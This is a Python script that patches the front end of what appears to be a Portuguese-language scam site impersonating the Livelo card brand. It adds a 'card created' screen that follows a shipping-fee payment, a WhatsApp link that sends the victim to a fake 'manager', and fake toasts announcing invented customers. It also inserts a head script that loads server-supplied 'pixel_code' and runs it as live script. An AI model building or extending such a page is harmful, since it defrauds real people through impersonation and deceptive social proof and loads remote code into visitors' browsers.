import re

index_path = "templates/index.html"
js_path = "static/js/main.js"

with open(index_path, "r", encoding="utf-8") as f:
    index_html = f.read()

# Add Favicon and Pixel fetch to head
head_script = """
  <link id="dynamic-favicon" rel="icon" href="">
  <script>
    fetch('/api/config')
      .then(res => res.json())
      .then(data => {
        if(data.favicon) {
          document.getElementById('dynamic-favicon').href = data.favicon;
        }
        if(data.pixel_code) {
          const div = document.createElement('div');
          div.innerHTML = data.pixel_code;
          Array.from(div.children).forEach(child => {
            if(child.tagName === 'SCRIPT') {
              const script = document.createElement('script');
              if(child.src) script.src = child.src;
              else script.text = child.text;
              document.head.appendChild(script);
            } else {
              document.body.appendChild(child);
            }
          });
        }
      }).catch(e => console.log(e));
  </script>
"""

if "dynamic-favicon" not in index_html:
    index_html = index_html.replace("</head>", head_script + "</head>")


# Add Screen Sucesso
sucesso_html = """
    <!-- TELA SUCESSO -->
    <div id="screen-sucesso" class="screen">
      <div class="content-box" style="text-align: center; max-width: 450px;">
        <svg viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2" style="width: 64px; height: 64px; margin: 0 auto 16px;">
          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
          <polyline points="22 4 12 14.01 9 11.01"></polyline>
        </svg>
        <h2 style="font-size: 1.8rem; font-weight: 800; color: #10B981; margin-bottom: 8px;">Cartão Criado com Sucesso!</h2>
        <p style="color: var(--text-dim); margin-bottom: 24px; line-height: 1.5;">O seu pagamento foi confirmado e a fabricação do seu cartão Livelo foi iniciada.</p>
        
        <div style="position: relative; perspective: 1000px; margin: 30px auto; width: 100%; max-width: 300px; height: 180px;">
          <div id="success-card-visual" style="width: 100%; height: 100%; border-radius: 16px; background: linear-gradient(135deg, #E5147A, #5e0b34); padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; flex-direction: column; justify-content: flex-end; position: relative; animation: successFloat 3s ease-in-out infinite;">
            <div style="position: absolute; top: 16px; right: 16px;">
              <svg width="40" height="28" viewBox="0 0 40 28" fill="none" style="opacity: 0.8"><rect x="0.5" y="0.5" width="39" height="27" rx="3.5" fill="#C4C4C4" fill-opacity="0.2" stroke="white"/><path d="M7 10H14V18H7V10Z" fill="white" fill-opacity="0.8"/></svg>
            </div>
            <div id="success-card-name" style="color: #fff; font-size: 1.1rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase;">SEU NOME</div>
            <div style="color: rgba(255,255,255,0.7); font-size: 0.75rem; margin-top: 4px;">Limite Liberado: <span id="success-card-limit" style="font-weight: 800; color: #fff;">-</span></div>
          </div>
        </div>

        <div style="background: rgba(229, 20, 122, 0.1); border: 1px solid var(--primary); padding: 16px; border-radius: 12px; margin-top: 24px;">
          <h4 style="color: var(--primary); font-weight: 700; margin-bottom: 8px;">Atenção</h4>
          <p style="font-size: 0.85rem; color: var(--text-dim); line-height: 1.4;">A sua gerente entrará em contato com você pelo WhatsApp em um prazo estimado de <strong>3 a 5 minutos</strong> para confirmar o endereço de entrega.</p>
        </div>
        
        <a id="btn-contact-manager" href="#" target="_blank" class="btn" style="margin-top: 24px;">
          Falar com a Gerente Agora
          <svg style="width: 20px; height: 20px; margin-left:8px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
        </a>
      </div>
    </div>
    
    <!-- FAKE TOAST CONTAINER -->
    <div id="fake-toast-container" style="position: fixed; bottom: 20px; left: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; pointer-events: none;"></div>
    
    <style>
      @keyframes successFloat {
        0%, 100% { transform: translateY(0) rotateX(5deg) rotateY(0deg); }
        50% { transform: translateY(-10px) rotateX(10deg) rotateY(-5deg); box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
      }
      .fake-toast {
        background: var(--bg-card); border: 1px solid var(--border); padding: 12px 16px; border-radius: 8px;
        display: flex; align-items: center; gap: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        transform: translateX(-100%); opacity: 0; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      }
      .fake-toast.show { transform: translateX(0); opacity: 1; }
      .fake-toast-img { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
      .fake-toast-content { display: flex; flex-direction: column; }
      .fake-toast-title { font-size: 0.8rem; font-weight: 700; color: var(--text); }
      .fake-toast-desc { font-size: 0.7rem; color: var(--text-dim); }
    </style>
"""

if "screen-sucesso" not in index_html:
    index_html = index_html.replace('</main>', sucesso_html + "\n  </main>")
    with open(index_path, "w", encoding="utf-8") as f:
        f.write(index_html)


with open(js_path, "r", encoding="utf-8") as f:
    js_code = f.read()

# Update showDone to use screen-sucesso
new_showDone = """function showDone() {
  let waNumber = window.APP_WA_NUM || STATE.managerWa || '5511999999999';
  waNumber = waNumber.replace(/\\D/g, '');
  if (waNumber.length > 0 && !waNumber.startsWith('55')) waNumber = '55' + waNumber;
  
  let rawText = window.APP_WA_TEXT || 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!';
  rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));
  rawText = rawText.replace('{limite}', STATE.limite || 'R$ 4.500,00');
  
  const msg = encodeURIComponent(rawText);
  $id('btn-contact-manager').href = `https://wa.me/${waNumber}?text=${msg}`;
  
  // Render Custom Card info in Success Screen
  const cv = $id('success-card-visual');
  if(cv && CARD_TEMPLATES[STATE.color || 'classico']) cv.style.background = CARD_TEMPLATES[STATE.color || 'classico'].bg;
  const cn = $id('success-card-name');
  if(cn) cn.innerText = STATE.nome_completo || 'SEU NOME';
  const cl = $id('success-card-limit');
  if(cl) cl.innerText = STATE.limite || 'R$ 4.500,00';

  goToStep('sucesso');
  startFakeNotifications();
}

function startFakeNotifications() {
  if(window._fakeToastInt) return;
  const names = ["Ana", "Carlos", "Beatriz", "João", "Mariana", "Pedro", "Juliana", "Fernando", "Camila", "Rafael"];
  const chars = ["S.", "M.", "P.", "L.", "R.", "C.", "G.", "A.", "F.", "V."];
  
  window._fakeToastInt = setInterval(() => {
    if(Math.random() > 0.4) {
      const n = names[Math.floor(Math.random()*names.length)];
      const c = chars[Math.floor(Math.random()*chars.length)];
      showFakeToast(`${n} ${c}`, `Acabou de criar o cartão.`);
    }
  }, 8000);
}

function showFakeToast(title, desc) {
  const container = $id('fake-toast-container');
  if(!container) return;
  const el = document.createElement('div');
  el.className = 'fake-toast';
  el.innerHTML = `
    <img src="https://ui-avatars.com/api/?name=${title.charAt(0)}&background=E5147A&color=fff&rounded=true" class="fake-toast-img">
    <div class="fake-toast-content">
      <div class="fake-toast-title">${title}</div>
      <div class="fake-toast-desc">${desc}</div>
    </div>
  `;
  container.appendChild(el);
  setTimeout(() => el.classList.add('show'), 100);
  setTimeout(() => {
    el.classList.remove('show');
    setTimeout(() => el.remove(), 400);
  }, 4000);
}
"""

js_code = re.sub(r'function showDone\(\) \{.*?\}\n', new_showDone, js_code, flags=re.DOTALL)

with open(js_path, "w", encoding="utf-8") as f:
    f.write(js_code)

print("Frontend Updated!")
